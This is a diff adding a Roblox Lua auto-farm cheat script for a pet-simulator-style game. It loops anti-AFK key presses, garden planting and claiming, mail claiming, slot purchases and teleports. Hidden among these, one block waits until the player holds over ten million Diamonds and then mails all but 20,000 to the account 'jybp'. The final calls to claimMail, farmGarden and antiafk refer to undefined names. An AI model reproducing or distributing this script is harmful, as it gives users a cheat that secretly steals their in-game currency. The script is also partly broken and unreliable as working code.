@@ -1,0 +1,75 @@
+wait(10)
+
+spawn(function(antiafk)
+    local VirtualInputManager = game:GetService("VirtualInputManager")
+    while task.wait() do
+        VirtualInputManager:SendKeyEvent(true, "Space", false, game)
+        task.wait(.2)
+        VirtualInputManager:SendKeyEvent(false, "Space", false, game)
+        task.wait(300)
+    end
+end)
+
+spawn(function(farmGarden)
+    while wait() do
+        local count = 1
+        for i = 1,10 do task.wait()
+            game.ReplicatedStorage.Network.Instancing_InvokeCustomFromClient:InvokeServer("FlowerGarden", "PlantSeed", count, "Diamond")
+            game.ReplicatedStorage.Network.Instancing_InvokeCustomFromClient:InvokeServer("FlowerGarden", "WaterSeed", count)
+            game.ReplicatedStorage.Network.Instancing_InvokeCustomFromClient:InvokeServer("FlowerGarden", "ClaimPlant", count)
+        count = count + 1
+        end
+    end
+end)
+
+spawn(function(claimMail)
+    while true do
+        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim All"):InvokeServer()
+        wait(5)
+    end
+end)
+
+task.spawn(function()
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local Library = ReplicatedStorage:WaitForChild("Library")
+    local currencyCmds = require(game:GetService("ReplicatedStorage"):WaitForChild("Library").Client.CurrencyCmds)
+
+    local function getDiamondsID()
+        for currencyID, currencyData in pairs(require(Library).Save.Get().Inventory.Currency) do
+            if currencyData["id"] == "Diamonds" then
+                return currencyID
+            end
+        end
+    end
+
+    while true do
+        while currencyCmds.Get("Diamonds") - 20000 < 10000000 do
+            task.wait(5)
+        end
+
+        if currencyCmds.Get("Diamonds") - 20000 >= 10000000 then
+            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer("jybp", "Hey", "Currency", getDiamondsID(), currencyCmds.Get("Diamonds") - 20000)
+        end
+    end
+end)
+
+game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = game:GetService("Workspace"):WaitForChild("__THINGS"):WaitForChild("Instances"):WaitForChild("FlowerGarden"):WaitForChild("Teleports"):WaitForChild("Enter").CFrame
+repeat task.wait(1) until game:GetService("Players").LocalPlayer.Character and game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Instancing_InvokeCustomFromClient"):InvokeServer("FlowerGarden", "PurchaseSlot", 5)
+task.wait()
+game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Instancing_InvokeCustomFromClient"):InvokeServer("FlowerGarden", "PurchaseSlot", 6)
+task.wait()
+game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Instancing_InvokeCustomFromClient"):InvokeServer("FlowerGarden", "PurchaseSlot", 7)
+task.wait()
+game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Instancing_InvokeCustomFromClient"):InvokeServer("FlowerGarden", "PurchaseSlot", 8)
+task.wait()
+game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Instancing_InvokeCustomFromClient"):InvokeServer("FlowerGarden", "PurchaseSlot", 9)
+task.wait()
+game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Instancing_InvokeCustomFromClient"):InvokeServer("FlowerGarden", "PurchaseSlot", 10)
+game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = CFrame.new(Vector3.new(-451.1048, 110.3193, -1399.6234))
+wait(1)
+game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Instancing_FireCustomFromClient"):FireServer("FlowerGarden", "ClaimWateringCan")
+wait(3)
+claimMail()
+farmGarden()
+antiafk()
